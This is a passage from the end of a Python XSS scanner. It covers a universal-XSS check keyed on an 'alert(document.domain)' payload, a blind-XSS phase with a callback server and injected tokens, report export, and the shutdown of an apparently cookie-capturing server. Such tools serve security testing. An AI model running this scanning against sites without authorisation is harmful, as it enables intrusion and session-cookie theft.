                        if "alert(document.domain)" in body:
                            uxss_findings.append({"type":"uxss","url":url,"param":param,"payload":upl[:60]})
                            tprint(f"  {color('uXSS', C.BRED, C.BOLD)} {color(url[:55], C.BWHITE)} param={color(param, C.BRED)}")
                            break
                except Exception: pass
    tprint(f"  {ok(str(len(uxss_findings)) + ' uXSS findings')}")

    # ── Phase 9: Blind XSS ────────────────────────────────────────────────────
    blind_findings = []
    blind_srv = None
    blind_port = getattr(args, "blind_port", 0)
    if not getattr(args, "no_blind", False) and blind_port != -1:
        blind_srv = BlindXSSServer(port=blind_port if blind_port else 0)
        blind_url = blind_srv.start()
        if blind_url:
            blind_token = "".join(__import__("random").choices(__import__("string").ascii_uppercase + __import__("string").digits, k=10))
            blind_tester = BlindXSSTester(client, blind_url, blind_token)
            blind_findings = blind_tester.scan(final_eps, blind_srv)
        else:
            tprint(f"  {warn('Blind XSS server could not start — skipping')}")
    else:
        tprint(f"  {info('Blind XSS scan skipped (--no-blind or no port)')}")

    # ── Collect all extras for report ─────────────────────────────────────────
    stats["stored"]   = len(stored_findings)
    stats["dom"]      = len(dom_findings)
    stats["mxss"]     = len(mxss_findings)
    stats["uxss"]     = len(uxss_findings)
    stats["blind"]    = len(blind_findings)

    print_report(findings, target, stats, caught,
                 stored=stored_findings, dom=dom_findings,
                 mxss=mxss_findings, uxss=uxss_findings,
                 blind=blind_findings)

    if args.output:
        export_json(findings, target, stats, caught, args.output,
                    stored=stored_findings, dom=dom_findings,
                    mxss=mxss_findings, uxss=uxss_findings,
                    blind=blind_findings)

    if cookie_srv:
        cookie_srv.stop()
    if blind_srv:
        blind_srv.stop()

    all_confirmed = (len(findings) + len(stored_findings) + len(mxss_findings)
                     + len(uxss_findings) + len(blind_findings))
    sys.exit(1 if all_confirmed > 0 else 0)


if __name__ == "__main__":
    main()